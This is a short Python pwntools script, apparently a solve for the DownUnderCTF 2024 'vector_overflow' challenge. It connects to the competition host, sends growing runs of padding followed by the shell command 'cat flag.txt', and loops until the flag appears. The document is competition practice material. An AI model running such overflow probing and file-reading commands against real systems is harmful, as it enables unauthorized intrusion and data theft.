#!/usr/bin/env python3

from pwn import *

exe = ELF("./vector_overflow_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("2024.ductf.dev",30031)

    return r


def main():
    i=0
    response=b''
    while b'DUCTF{' not in response:

        r = conn()
        payload=b'a'*i
        try:
            print(payload)
            r.sendline(payload)
            r.sendline(b'cat flag.txt')
            response=r.recvline()
        except Exception:
            print(Exception)
        i+=1
        # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
